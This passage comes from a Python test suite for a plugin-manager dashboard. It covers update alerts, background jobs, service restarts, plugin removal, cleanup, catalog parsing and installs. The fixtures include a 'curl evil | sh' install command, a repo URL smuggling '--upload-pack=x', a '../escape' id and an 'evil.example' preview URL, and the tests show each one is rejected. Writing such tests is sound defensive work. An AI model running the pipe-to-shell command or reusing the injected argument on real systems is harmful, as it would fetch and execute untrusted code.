        self.assertFalse(dash.alerts(item))

    def test_a_version_bump_alerts(self):
        item = self.behind_item('{"version": "1.2.0"}')
        self.assertEqual((item['upstreamVersion'], item['versionChange']), ('1.2.0', True))
        self.assertTrue(dash.alerts(item))

    def test_not_read_unless_behind(self):
        with patch.object(dash, 'plugin_update_state', return_value=('up-to-date', 0, '')):
            item = dash.check_plugin({'id': 'x.plugin', 'enabled': True})
        self.assertEqual((item['upstreamVersion'], item['versionChange']), ('', None))


class AlertsTests(unittest.TestCase):
    def test_alerts(self):
        self.assertTrue(dash.alerts({'updateState': 'behind', 'versionChange': True}))
        self.assertTrue(dash.alerts({'updateState': 'behind', 'versionChange': None}), 'unknown still alerts')
        self.assertTrue(dash.alerts({'updateState': 'not-installed'}))
        self.assertFalse(dash.alerts({'updateState': 'behind', 'versionChange': False}))
        self.assertFalse(dash.alerts({'updateState': 'behind', 'held': True}))
        self.assertFalse(dash.alerts({'updateState': 'dirty'}))

    def test_no_notification_for_a_same_version_commit(self):
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates([{'id': 'a', 'name': 'A', 'updateState': 'behind', 'versionChange': False}], set())
        run_mock.assert_not_called()

    def test_a_bump_beside_a_same_version_commit_notifies_for_the_bump_only(self):
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates([{'id': 'a', 'name': 'A', 'updateState': 'behind', 'versionChange': False},
                                     {'id': 'b', 'name': 'B', 'updateState': 'behind', 'versionChange': True}], set())
        args = run_mock.call_args.args[0]
        self.assertEqual(args[args.index('await-notification') + 1:], ['Update available', 'B', 'b'])


class JobFixture(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        patcher = patch.object(dash, 'STATE', Path(self._tmp.name))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.ran = []

        def fake_update(args):
            self.ran.append(args.id)
            if args.id == 'boom':
                raise RuntimeError('kaput')
            if args.id == 'silent':
                return
            print('noise from a command')
            print(json.dumps({'ok': args.id != 'bad', 'message': 'did ' + args.id}))
        patcher = patch.object(dash, 'cmd_update', fake_update)
        patcher.start()
        self.addCleanup(patcher.stop)


class JobTests(JobFixture):
    def test_a_job_runs_every_item_and_records_each_result_then_closes(self):
        job = dash.execute_job(dash.new_job('update', ['a', 'bad', 'c']))
        self.assertEqual(self.ran, ['a', 'bad', 'c'])
        saved = dash.load_job()
        self.assertEqual(saved['state'], 'done')
        self.assertEqual(saved['current'], '')
        self.assertEqual([(r['id'], r['ok'], r['message']) for r in saved['results']],
                         [('a', True, 'did a'), ('bad', False, 'did bad'), ('c', True, 'did c')])
        self.assertEqual(job['results'], saved['results'])

    def test_one_item_crashing_does_not_lose_the_rest(self):
        dash.execute_job(dash.new_job('update', ['boom', 'silent', 'a']))
        results = dash.load_job()['results']
        self.assertEqual([r['ok'] for r in results], [False, False, True])
        self.assertIn('kaput', results[0]['message'])
        self.assertIn('did not report', results[1]['message'])

    def test_job_json_says_which_item_is_running_while_it_runs(self):
        seen = []
        def peek(args):
            j = dash.load_job()
            seen.append((j['state'], j['current'], j['pid']))
            print(json.dumps({'ok': True}))
        with patch.object(dash, 'cmd_update', peek):
            dash.execute_job(dash.new_job('update', ['x', 'y']))
        self.assertEqual(seen, [('running', 'x', dash.os.getpid()), ('running', 'y', dash.os.getpid())])

    def test_a_second_job_is_refused_while_one_is_going(self):
        self.assertIsNotNone(dash.new_job('update', ['a']))
        self.assertIsNone(dash.new_job('update', ['b']))   # still 'starting', inside the grace
        job = dash.load_job()
        job.update(state='running', pid=dash.os.getpid())
        dash.save_job(job)
        self.assertIsNone(dash.new_job('rollback', ['b']))

    def test_a_job_whose_worker_died_is_closed_with_failures_and_frees_the_slot(self):
        job = dash.new_job('update', ['a', 'b', 'c'])
        job.update(state='running', pid=2 ** 22 + 12345, results=[{'id': 'a', 'ok': True, 'message': ''}])
        dash.save_job(job)
        dash.reap_stale_job()
        saved = dash.load_job()
        self.assertEqual(saved['state'], 'done')
        self.assertEqual([(r['id'], r['ok']) for r in saved['results']], [('a', True), ('b', False), ('c', False)])
        self.assertIsNotNone(dash.new_job('update', ['d']))   # the slot is free again

    def test_a_job_never_taken_up_is_reaped_after_the_grace(self):
        dash.new_job('update', ['a'])
        dash.reap_stale_job(now=time.time() + dash.JOB_START_GRACE_SECONDS + 1)
        self.assertEqual(dash.load_job()['state'], 'done')

    def test_run_job_only_takes_the_job_it_was_started_for(self):
        job = dash.new_job('update', ['a'])
        dash.cmd_run_job(type('A', (), {'job_id': 'not-' + job['jobId']})())
        self.assertEqual(self.ran, [])
        dash.cmd_run_job(type('A', (), {'job_id': job['jobId']})())
        self.assertEqual(self.ran, ['a'])
        dash.cmd_run_job(type('A', (), {'job_id': job['jobId']})())   # already done: not again
        self.assertEqual(self.ran, ['a'])

    def test_rollback_and_remove_go_through_their_own_commands(self):
        calls = []
        for name in ('cmd_rollback', 'cmd_remove'):
            p = patch.object(dash, name, lambda a, n=name: calls.append((n, a.id)) or print(json.dumps({'ok': True})))
            p.start()
            self.addCleanup(p.stop)
        dash.execute_job(dash.new_job('rollback', ['r']))
        dash.execute_job(dash.new_job('remove', ['m']))
        self.assertEqual(calls, [('cmd_rollback', 'r'), ('cmd_remove', 'm')])


class StartJobTests(JobFixture):
    def start(self, run_rc=0, popen=None):
        printed, calls = [], []
        def fake_run(args, **kw):
            calls.append(list(args))
            return (run_rc, '', '' if run_rc == 0 else 'no user bus')
        with patch.object(dash, 'run', fake_run), \
                patch('builtins.print', lambda *a, **k: printed.append(json.loads(a[0]))), \
                patch.object(dash.subprocess, 'Popen', popen or (lambda *a, **k: calls.append(('popen', a[0])))):
            dash.cmd_start(type('A', (), {'kind': 'update', 'ids': ['a', 'b']})())
        return printed[-1], calls

    def test_the_worker_runs_in_its_own_transient_unit_named_for_the_job(self):
        r, calls = self.start()
        self.assertTrue(r['ok'])
        job = dash.load_job()
        self.assertEqual((job['state'], job['ids'], r['jobId']), ('starting', ['a', 'b'], job['jobId']))
        self.assertEqual(calls[0][:5], ['systemd-run', '--user', '--collect', '--quiet',
                                        f'--unit=dashboard-job-{job["jobId"]}'])
        self.assertEqual(calls[0][-2:], ['run-job', job['jobId']])
        self.assertEqual(self.ran, [])   # it only hands over

    def test_without_systemd_run_it_starts_a_new_session(self):
        seen = {}
        def popen(args, **kw):
            seen.update(kw, args=args)
        r, _ = self.start(run_rc=1, popen=popen)
        self.assertTrue(r['ok'])
        self.assertTrue(seen['start_new_session'])
        self.assertEqual(seen['args'][-2], 'run-job')

    def test_when_nothing_can_start_it_the_job_is_closed_as_failed(self):
        def popen(*a, **k):
            raise OSError('no python')
        r, _ = self.start(run_rc=1, popen=popen)
        self.assertFalse(r['ok'])
        job = dash.load_job()
        self.assertEqual(job['state'], 'done')
        self.assertEqual([x['ok'] for x in job['results']], [False, False])

    def test_busy_is_reported_not_queued(self):
        dash.new_job('update', ['z'])
        r, calls = self.start()
        self.assertFalse(r['ok'])
        self.assertIn('still running', r['message'])
        self.assertEqual(calls, [])


class RestartUpdatedUnitsTests(RealRepoFixture):
    def setUp(self):
        super().setUp()
        (self.units / 'gpu.service').write_text('[Service]\nExecStart=/p/x.plugin/run\n')
        (self.units / 'other.service').write_text('[Service]\nExecStart=/elsewhere/run\n')
        (self.units / 'gpu.timer').write_text('[Timer]\n')
        self.active = {'gpu.service', 'other.service', 'gpu.timer'}
        self.restart_rc = 0
        real = dash.run
        def fake(args, cwd=None, timeout=20, **kw):
            if args[:3] == ['systemctl', '--user', 'is-active']:
                self.calls.append(list(args))
                return (0 if args[3] in self.active else 3, 'active\n' if args[3] in self.active else 'inactive\n', '')
            if args[:3] == ['systemctl', '--user', 'restart']:
                self.calls.append(list(args))
                return (self.restart_rc, '', 'nope' if self.restart_rc else '')
            return real(args, cwd=cwd, timeout=timeout, **kw)
        p = patch.object(dash, 'run', fake)
        p.start()
        self.addCleanup(p.stop)
        self.shipped = {'gpu.service': None, 'other.service': None, 'gpu.timer': None}

    def restarted(self):
        return [c[3] for c in self.calls if c[:3] == ['systemctl', '--user', 'restart']]

    def commit(self, name, text='x'):
        (self.plugin / name).parent.mkdir(parents=True, exist_ok=True)
        (self.plugin / name).write_text(text)
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'c')
        return git(self.plugin, 'rev-parse', 'HEAD')

    def test_a_code_change_restarts_the_running_services_that_run_this_plugin(self):
        head = self.commit('collectors/cpu.py')
        messages, ok = dash.restart_updated_units(self.plugin, self.new, head, self.shipped)
        self.assertTrue(ok)
        self.assertEqual(self.restarted(), ['gpu.service'])   # not the foreign one, not the timer
        self.assertIn('Restarted gpu.service', messages[0])

    def test_docs_tests_and_images_do_not(self):
        self.commit('README.md'); self.commit('docs/a.txt'); self.commit('tests/t.py')
        head = self.commit('preview.png')
        self.assertEqual(dash.restart_updated_units(self.plugin, self.new, head, self.shipped), ([], True))
        self.assertEqual(self.restarted(), [])

    def test_a_stopped_service_is_left_stopped(self):
        self.active = set()
        head = self.commit('collectors/cpu.py')
        dash.restart_updated_units(self.plugin, self.new, head, self.shipped)
        self.assertEqual(self.restarted(), [])

    def test_a_failed_restart_is_a_failure(self):
        self.restart_rc = 1
        head = self.commit('collectors/cpu.py')
        messages, ok = dash.restart_updated_units(self.plugin, self.new, head, self.shipped)
        self.assertFalse(ok)
        self.assertIn('gpu.service did not restart: nope', messages)

    def test_nothing_moved_nothing_restarted(self):
        self.assertEqual(dash.restart_updated_units(self.plugin, self.new, self.new, self.shipped), ([], True))
        self.assertEqual(dash.restart_updated_units(self.plugin, '', self.new, self.shipped), ([], True))

    def test_an_update_that_changed_code_restarts_and_says_so(self):
        head = self.commit('collectors/cpu.py')
        git(self.plugin, 'reset', '-q', '--hard', self.new)
        real = dash.run
        def updating(args, **kw):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                git(self.plugin, 'reset', '-q', '--hard', head)
                return (0, 'Updated x.plugin.', '')
            return real(args, **kw)
        with patch.object(dash, 'run', updating):
            dash.cmd_update(type('A', (), {'id': 'x.plugin'})())
        self.assertTrue(self.printed[-1]['ok'], self.printed[-1])
        self.assertIn('Restarted gpu.service', self.printed[-1]['message'])
        self.assertEqual(self.restarted(), ['gpu.service'])


class RemovalFixture(unittest.TestCase):
    """Plugins, units, data roots and state all under one temp dir; systemctl, omarchy and
    gio are recorded, and `omarchy plugin remove` really deletes the folder."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.root = root
        self.plugins = root / 'plugins'
        self.units = root / 'units'
        self.state_root = root / 'local/state'
        self.cache = root / 'cache'
        for d in (self.plugins, self.units, self.state_root, self.cache):
            d.mkdir(parents=True)
        self.calls, self.trashed = [], []
        self.remove_rc = 0
        self.trash_rc = 0

        def fake(args, cwd=None, timeout=20, **kw):
            self.calls.append(list(args))
            if args[:3] == ['omarchy', 'plugin', 'remove']:
                if self.remove_rc == 0:
                    import shutil
                    shutil.rmtree(self.plugins / args[3])
                    return (0, f'Removed {args[3]}.', '')
                return (1, '', 'refused')
            if args[:2] == ['gio', 'trash']:
                if self.trash_rc == 0:
                    import shutil
                    shutil.rmtree(args[2])
                    self.trashed.append(args[2])
                    return (0, '', '')
                return (1, '', 'no trash')
            return (0, '', '')
        self.printed = []
        state = root / 'dashstate'
        for target, value in (('run', fake), ('PLUGINS_DIR', self.plugins), ('USER_UNIT_DIR', self.units),
                              ('DATA_ROOTS', (self.state_root, self.cache)),
                              ('PLUGIN_STATE_ROOT', self.state_root / 'omarchy/plugins'),
                              ('STATE', state), ('STATUS_PATH', state / 'status.json'),
                              ('check_all', lambda: None)):
            patcher = patch.object(dash, target, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        printer = patch('builtins.print', lambda *a, **k: self.printed.append(json.loads(a[0])))
        printer.start()
        self.addCleanup(printer.stop)

    def plugin(self, pid, name='', code='', units=()):
        d = self.plugins / pid
        d.mkdir(parents=True)
        (d / 'manifest.json').write_text(json.dumps({'name': name or pid}))
        if code:
            (d / 'Panel.qml').write_text(code)
        for u in units:
            (d / u).write_text(f'[Service]\nExecStart=/h/.config/omarchy/plugins/{pid}/run\n')
        return d

    def install_unit(self, name, pid):
        (self.units / name).write_text(f'[Service]\nExecStart=/h/.config/omarchy/plugins/{pid}/collectors/x.py\n')

    def data(self, root, name):
        d = root / name
        d.mkdir(parents=True)
        (d / 'f').write_text('12345')
        return d

    def remove(self, pid, purge=False):
        dash.cmd_remove(type('A', (), {'id': pid, 'purge': purge})())
        return self.printed[-1]


class RemovalPlanTests(RemovalFixture):
    def test_units_are_matched_on_the_plugin_path_not_the_unit_name(self):
        self.plugin('nixfred.pulse', 'Pulse')
        self.plugin('nixfred.cpu-pulse', 'CPU Pulse')
        self.install_unit('cpu-pulse.service', 'nixfred.pulse')
        self.install_unit('nixfred.pulse-ish.service', 'nixfred.pulse-ish')
        self.assertEqual(dash.installed_plugin_units('nixfred.pulse'), ['cpu-pulse.service'])
        self.assertEqual(dash.installed_plugin_units('nixfred.cpu-pulse'), [])

    def test_data_named_by_id_name_units_and_code_is_found_with_its_size(self):
        self.plugin('com.omastorm.radar', 'Omastorm', code='dir: home + "/.cache/omastorm-tiles/x"',
                    units=('radar-feed.service',))
        for root, name in ((self.state_root, 'omastorm'), (self.cache, 'omastorm-tiles'),
                           (self.state_root, 'radar-feed'), (self.state_root, 'radar'),
                           (self.state_root, 'omarchy/plugins/com.omastorm.radar')):
            self.data(root, name)
        self.data(self.state_root, 'unrelated')
        paths = sorted(Path(d['path']).relative_to(self.root).as_posix() for d in dash.plugin_data_dirs('com.omastorm.radar'))
        self.assertEqual(paths, ['cache/omastorm-tiles', 'local/state/omarchy/plugins/com.omastorm.radar',
                                 'local/state/omastorm', 'local/state/radar', 'local/state/radar-feed'])
        self.assertEqual(dash.plugin_data_dirs('com.omastorm.radar')[0]['size'], 5)

    def test_data_another_plugin_also_points_at_or_everyone_shares_is_never_offered(self):
        self.plugin('nixfred.cpu-pulse', 'CPU Pulse')
        self.plugin('nixfred.pulse', 'Pulse', units=('cpu-pulse.service',),
                    code='"/.local/state/omarchy/current/theme"')
        self.data(self.state_root, 'cpu-pulse')
        self.data(self.state_root, 'omarchy')
        self.assertEqual(dash.plugin_data_dirs('nixfred.cpu-pulse'), [])
        self.assertEqual(dash.plugin_data_dirs('nixfred.pulse'), [])

    def test_plan_reports_folder_kind_and_backups(self):
        self.plugin('a.b', 'AB')
        (self.plugins / '.a.b.bak.20260908163316').mkdir()
        (self.plugins / '.a.bc.bak.20260908163316').mkdir()
        plan = dash.removal_plan('a.b')
        self.assertEqual((plan['name'], plan['folder']['kind']), ('AB', 'plain'))
        self.assertEqual([Path(b['path']).name for b in plan['backups']], ['.a.b.bak.20260908163316'])


class CmdRemoveTests(RemovalFixture):
    def setUp(self):
        super().setUp()
        self.plugin('nixfred.pulse', 'Pulse')
        self.install_unit('cpu-pulse.service', 'nixfred.pulse')
        self.data_dir = self.data(self.state_root, 'pulse')

    def test_services_stop_before_the_folder_goes_and_their_units_are_removed(self):
        r = self.remove('nixfred.pulse')
        self.assertTrue(r['ok'], r)
        self.assertLess(self.calls.index(['systemctl', '--user', 'stop', 'cpu-pulse.service']),
                        self.calls.index(['omarchy', 'plugin', 'remove', 'nixfred.pulse', '--yes']))
        self.assertIn(['systemctl', '--user', 'disable', '--now', 'cpu-pulse.service'], self.calls)
        self.assertFalse((self.units / 'cpu-pulse.service').exists())
        self.assertIn('Stopped and removed cpu-pulse.service.', r['message'])

    def test_without_purge_data_is_kept_and_remembered_for_leftovers(self):
        r = self.remove('nixfred.pulse')
        self.assertTrue(self.data_dir.exists())
        self.assertIn('Kept its data', r['message'])
        entry = dash.load_history()[-1]
        self.assertEqual((entry['action'], entry['name'], entry['dataKept']), ('remove', 'Pulse', [str(self.data_dir)]))
        self.assertEqual([i['key'] for i in dash.leftovers()], ['data:' + str(self.data_dir)])

    def test_purge_moves_data_to_the_trash(self):
        r = self.remove('nixfred.pulse', purge=True)
        self.assertTrue(r['ok'])
        self.assertEqual(self.trashed, [str(self.data_dir)])
        self.assertEqual(dash.load_history()[-1]['dataKept'], [])

    def test_a_trash_that_fails_is_a_failure_and_the_data_is_still_listed(self):
        self.trash_rc = 1
        r = self.remove('nixfred.pulse', purge=True)
        self.assertFalse(r['ok'])
        self.assertIn('no trash', r['message'])
        self.assertEqual(dash.load_history()[-1]['dataKept'], [str(self.data_dir)])

    def test_if_omarchy_refuses_the_services_start_again_and_nothing_is_recorded(self):
        self.remove_rc = 1
        r = self.remove('nixfred.pulse')
        self.assertFalse(r['ok'])
        self.assertIn(['systemctl', '--user', 'start', 'cpu-pulse.service'], self.calls)
        self.assertTrue((self.units / 'cpu-pulse.service').exists())
        self.assertEqual(dash.load_history(), [])

    def test_a_hold_is_dropped(self):
        dash.save_holds({'nixfred.pulse': {'ts': 1, 'reason': 'x'}, 'other': {'ts': 1, 'reason': 'y'}})
        self.remove('nixfred.pulse')
        self.assertEqual(list(dash.load_holds()), ['other'])

    def test_the_dashboard_still_refuses_to_remove_itself(self):
        r = self.remove(dash.SELF_ID)
        self.assertFalse(r['ok'])
        self.assertEqual(self.calls, [])


class LeftoversTests(RemovalFixture):
    def test_backups_and_units_of_missing_plugins_are_listed_and_live_ones_are_not(self):
        self.plugin('here.plugin')
        (self.plugins / '.gone.plugin.bak.20260908163316').mkdir()
        self.install_unit('alive.service', 'here.plugin')
        self.install_unit('orphan.service', 'gone.plugin')
        items = {i['key']: i for i in dash.leftovers()}
        self.assertEqual(sorted(items), ['backup:.gone.plugin.bak.20260908163316', 'unit:orphan.service'])
        self.assertEqual(items['backup:.gone.plugin.bak.20260908163316']['label'], 'gone.plugin backup · 2026-09-08')
        (self.plugins / '.gone.plugin.bak.20260908163316' / 'manifest.json').write_text('{"name": "Gone"}')
        self.assertEqual(dash.leftovers()[0]['label'], 'Gone backup · 2026-09-08')

    def test_kept_data_stops_being_a_leftover_once_the_plugin_is_back_or_the_folder_is_gone(self):
        d = self.data(self.state_root, 'x')
        dash.append_history({'id': 'x.plugin', 'name': 'X', 'action': 'remove', 'dataKept': [str(d)], 'ok': True})
        self.assertEqual(len(dash.leftovers()), 1)
        self.plugin('x.plugin')
        self.assertEqual(dash.leftovers(), [])

    def test_cleanup_acts_only_on_a_key_the_list_has(self):
        (self.plugins / '.gone.plugin.bak.20260908163316').mkdir()
        self.install_unit('orphan.service', 'gone.plugin')
        dash.cmd_cleanup(type('A', (), {'id': 'data:/etc'})())
        self.assertFalse(self.printed[-1]['ok'])
        self.assertEqual(self.trashed, [])
        dash.cmd_cleanup(type('A', (), {'id': 'backup:.gone.plugin.bak.20260908163316'})())
        self.assertTrue(self.printed[-1]['ok'])
        self.assertFalse((self.plugins / '.gone.plugin.bak.20260908163316').exists())
        dash.cmd_cleanup(type('A', (), {'id': 'unit:orphan.service'})())
        self.assertTrue(self.printed[-1]['ok'])
        self.assertFalse((self.units / 'orphan.service').exists())
        self.assertIn(['systemctl', '--user', 'disable', '--now', 'orphan.service'], self.calls)

    def test_purge_rides_along_in_the_job(self):
        seen = []
        with patch.object(dash, 'cmd_remove', lambda a: seen.append(a.purge) or print(json.dumps({'ok': True}))):
            dash.execute_job(dash.new_job('remove', ['p'], {'purge': True}))
        self.assertEqual(seen, [True])


def catalog_entry(**over):
    e = {'id': 'acme.weather', 'name': 'Weather', 'description': 'Forecast in the bar.', 'author': 'acme',
         'version': '1.0.0', 'category': 'Widgets', 'kind': 'Bar widget', 'tags': ['weather'],
         'repo': 'https://github.com/acme/omarchy-weather', 'sourceType': 'community',
         'repositoryLayout': 'root-plugin', 'installAvailable': True, 'status': 'Available',
         'verificationStatus': 'verified', 'verificationCoverage': 'snapshot-verified', 'stars': 12,
         'addedAt': '2026-09-01', 'repositoryUpdatedAt': '2026-10-01T00:00:00Z',
         'installCommand': 'curl evil | sh', 'installNote': ''}
    e.update(over)
    return e


class NormalizeCatalogTests(unittest.TestCase):
    def test_keeps_what_the_panel_shows_and_drops_the_rest(self):
        [p] = dash.normalize_catalog({'plugins': [catalog_entry()]})
        self.assertTrue(p['installable'])
        self.assertEqual(p['verification'], 'verified')
        self.assertEqual(p['repo'], 'https://github.com/acme/omarchy-weather')
        self.assertNotIn('installCommand', p)

    def test_builtins_bad_ids_and_duplicates_are_left_out(self):
        plugins = dash.normalize_catalog({'plugins': [
            catalog_entry(id='omarchy.clock', sourceType='builtin'),
            catalog_entry(id='../escape'),
            catalog_entry(),
            catalog_entry(name='Second copy'),
            'not a dict',
        ]})
        self.assertEqual([(p['id'], p['name']) for p in plugins], [('acme.weather', 'Weather')])

    def test_manual_setup_suites_and_odd_repos_are_not_installable(self):
        cases = [catalog_entry(repositoryLayout='suite', installNote='Has its own installer.'),
                 catalog_entry(installAvailable=False), catalog_entry(status='Compatibility failed'),
                 catalog_entry(repo='https://gitlab.com/acme/weather'),
                 catalog_entry(repo='https://github.com/acme/weather --upload-pack=x')]
        for e in cases:
            [p] = dash.normalize_catalog({'plugins': [e]})
            self.assertFalse(p['installable'], e)
            self.assertTrue(p['note'])
        self.assertEqual(dash.normalize_catalog({'plugins': [cases[0]]})[0]['note'], 'Has its own installer.')

    def test_repo_url_loses_trailing_git_and_slash(self):
        self.assertEqual(dash.catalog_repo('https://github.com/a/b.git'), 'https://github.com/a/b')
        self.assertEqual(dash.catalog_repo('https://github.com/a/b/'), 'https://github.com/a/b')
        self.assertEqual(dash.catalog_repo('git@github.com:a/b'), '')

    def test_preview_is_the_catalogs_own_thumbnail_or_nothing(self):
        [p] = dash.normalize_catalog({'plugins': [catalog_entry(
            previewThumbnail='assets/img/plugins/1-acme-card.webp', previewThumbnailWidth=720, previewThumbnailHeight=405)]})
        self.assertEqual(p['preview'], 'https://plugins.omarchy.org/assets/img/plugins/1-acme-card.webp')
        self.assertAlmostEqual(p['previewAspect'], 1.778, places=3)
        for bad in ('https://evil.example/x.webp', '../../x.webp', 'assets/img/plugins/x.svg', ''):
            [p] = dash.normalize_catalog({'plugins': [catalog_entry(previewThumbnail=bad)]})
            self.assertEqual(p['preview'], '', bad)

    def test_not_a_catalog_raises(self):
        with self.assertRaises(ValueError):
            dash.normalize_catalog({'items': []})


class CatalogFixture(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.plugins = root / 'plugins'
        self.plugins.mkdir()
        for name, value in (('STATE', root / 'state'), ('PLUGINS_DIR', self.plugins)):
            p = patch.object(dash, name, value)
            p.start()
            self.addCleanup(p.stop)
        p = patch.object(dash, 'check_all', lambda: {})
        p.start()
        self.addCleanup(p.stop)

    def output(self, fn, args):
        buf = __import__('io').StringIO()
        with __import__('contextlib').redirect_stdout(buf):
            fn(args)
        return json.loads(buf.getvalue().strip().splitlines()[-1])


class CmdCatalogTests(CatalogFixture):
    def test_fetches_and_caches_then_serves_the_cache(self):
        fetched = []
        def fake_fetch():
            fetched.append(1)
            return {'generatedAt': 'x', 'plugins': dash.normalize_catalog({'plugins': [catalog_entry()]})}
        with patch.object(dash, 'fetch_catalog', fake_fetch):
            r1 = self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=False))
            r2 = self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=False))
            self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=True))
        self.assertEqual((r1['ok'], r1['count'], r2['count']), (True, 1, 1))
        self.assertEqual(len(fetched), 2)
        self.assertEqual(dash._read_json(dash.catalog_path(), {})['plugins'][0]['id'], 'acme.weather')

    def test_failed_fetch_keeps_the_old_list_and_says_why(self):
        dash._write_json(dash.catalog_path(), {'ts': 1, 'plugins': [{'id': 'old'}]})
        def boom():
            raise OSError('no network')
        with patch.object(dash, 'fetch_catalog', boom):
            r = self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=False))
        self.assertFalse(r['ok'])
        saved = dash._read_json(dash.catalog_path(), {})
        self.assertEqual(saved['plugins'], [{'id': 'old'}])
        self.assertIn('no network', saved['error'])


class CatalogVerificationTests(CatalogFixture):
    def test_keeps_the_checked_commit_only_when_its_snapshot_was_verified(self):
        sha = 'a' * 40
        [p] = dash.normalize_catalog({'plugins': [catalog_entry(verificationCommit=sha.upper(),
                                                                verificationSnapshotStatus='verified')]})
        self.assertEqual(p['verifiedCommit'], sha)
        [p] = dash.normalize_catalog({'plugins': [catalog_entry(verificationCommit=sha,
                                                                verificationSnapshotStatus='unverified')]})
        self.assertEqual(p['verifiedCommit'], '')
        [p] = dash.normalize_catalog({'plugins': [catalog_entry(verificationCommit='not-a-sha',
                                                                verificationSnapshotStatus='verified')]})
        self.assertEqual(p['verifiedCommit'], '')

    def test_a_cache_from_before_the_schema_is_refetched(self):
        dash._write_json(dash.catalog_path(), {'ts': time.time(), 'plugins': [{'id': 'old'}]})
        with patch.object(dash, 'fetch_catalog', return_value={'generatedAt': 'x', 'plugins': [{'id': 'new'}]}):
            catalog, error = dash.refresh_catalog()
            self.assertEqual((catalog['plugins'], error), ([{'id': 'new'}], ''))
            self.assertEqual(dash.refresh_catalog()[0]['schema'], dash.CATALOG_SCHEMA)

    def _repo(self):
        repo = self.plugins / 'acme.weather'
        repo.mkdir()
        git(repo, 'init', '-q')
        git(repo, 'config', 'user.email', 't@t'); git(repo, 'config', 'user.name', 't')
        (repo / 'f').write_text('1'); git(repo, 'add', '.'); git(repo, 'commit', '-qm', 'one')
        first = git(repo, 'rev-parse', 'HEAD')
        (repo / 'f').write_text('2'); git(repo, 'commit', '-qam', 'two')
        return repo, first, git(repo, 'rev-parse', 'HEAD')

    def _index(self, checked, **over):
        return dash.catalog_index({'plugins': [dict({'id': 'acme.weather', 'repo': 'https://github.com/acme/omarchy-weather',
                                                      'verifiedCommit': checked}, **over)]})

    def test_verified_only_at_the_checked_commit(self):
        repo, first, second = self._repo()
        item = {'id': 'acme.weather', 'updateState': 'up-to-date', 'info': {'path': str(repo)}}
        self.assertEqual(dash.market_status(item, self._index(second))['installed'], 'verified')
        status = dash.market_status(item, self._index(first))
        self.assertEqual((status['installed'], status['sinceChecked'], status['checked']), ('unverified', 1, first[:7]))
        self.assertEqual(dash.market_status(item, self._index(''))['installed'], 'unverified')

    def test_an_update_is_judged_by_the_commit_it_brings(self):
        repo, first, second = self._repo()
        git(repo, 'reset', '-q', '--hard', first)
        (repo / '.git' / 'FETCH_HEAD').write_text(second + "\t\tbranch 'main' of x\n")
        item = {'id': 'acme.weather', 'updateState': 'behind', 'info': {'path': str(repo)}}
        status = dash.market_status(item, self._index(second))
        self.assertEqual((status['installed'], status['incoming']), ('unverified', 'verified'))
        status = dash.market_status(item, self._index(first))
        self.assertEqual((status['installed'], status['incoming']), ('verified', 'unverified'))

    def test_found_by_repo_when_the_id_differs_and_none_when_unlisted(self):
        repo, first, second = self._repo()
        item = {'id': 'mine', 'updateState': 'up-to-date',
                'info': {'path': str(repo), 'webUrl': 'https://github.com/Acme/omarchy-weather'}}
        self.assertEqual(dash.market_status(item, self._index(second))['id'], 'acme.weather')
        item['info']['webUrl'] = 'https://github.com/someone/else'
        self.assertIsNone(dash.market_status(item, self._index(second)))


class CmdInstallTests(CatalogFixture):
    def setUp(self):
        super().setUp()
        dash._write_json(dash.catalog_path(), {'ts': time.time(), 'plugins': dash.normalize_catalog({'plugins': [
            catalog_entry(), catalog_entry(id='acme.suite', repositoryLayout='suite', installNote='Own installer.'),
            catalog_entry(id='acme.bar', repo='https://github.com/acme/bar')]})})
        self.calls = []
        self.add_rc = 0
        self.kinds = ['bar-widget']
        self.listed = True

        def fake(args, cwd=None, timeout=20, **kw):
            self.calls.append(list(args))
            if args[:3] == ['omarchy', 'plugin', 'add']:
                if self.add_rc:
                    return (1, '', 'omarchy-plugin-add: refusing to add: validation failed')
                pid = 'acme.bar' if 'bar' in args[3] else 'acme.weather'
                (self.plugins / pid).mkdir()
                (self.plugins / pid / 'manifest.json').write_text(json.dumps({'version': '1.0.0', 'kinds': self.kinds}))
                return (0, f'Added {pid} into {self.plugins / pid}\n', '')
            if args[:3] == ['omarchy', 'plugin', 'list']:
                return (0, json.dumps([{'id': 'acme.weather'}] if self.listed else []), '')
            if args[:3] == ['omarchy', 'plugin', 'enable']:
                return (0, '', '')
            if args[:2] == ['git', '-C']:
                return (0, 'abc123\n', '')
            raise AssertionError('unexpected command: ' + ' '.join(args))
        p = patch.object(dash, 'run', fake)
        p.start()
        self.addCleanup(p.stop)
        p = patch.object(dash, 'INSTALL_DISCOVER_SECONDS', 0)
        p.start()
        self.addCleanup(p.stop)

    def install(self, plugin_id):
        return self.output(dash.cmd_install, __import__('argparse').Namespace(id=plugin_id))

    def test_adds_from_the_catalogs_repo_then_enables_and_records_it(self):
        r = self.install('acme.weather')
        self.assertTrue(r['ok'], r)
        self.assertIn(['omarchy', 'plugin', 'add', 'https://github.com/acme/omarchy-weather.git', '--yes'], self.calls)
        self.assertIn(['omarchy', 'plugin', 'enable', 'acme.weather'], self.calls)
        self.assertFalse(any('curl' in ' '.join(c) for c in self.calls))
        last = dash.load_history()[-1]
        self.assertEqual((last['action'], last['ok'], last['toVersion']), ('install', True, '1.0.0'))

    def test_not_in_the_catalog_or_not_installable_never_runs_anything(self):
        for plugin_id, says in (('acme.nope', 'not in the plugin catalog'), ('acme.suite', 'Own installer.')):
            r = self.install(plugin_id)
            self.assertFalse(r['ok'])
            self.assertIn(says, r['message'])
        self.assertEqual(self.calls, [])

    def test_already_installed_is_refused(self):
        (self.plugins / 'acme.weather').mkdir()
        r = self.install('acme.weather')
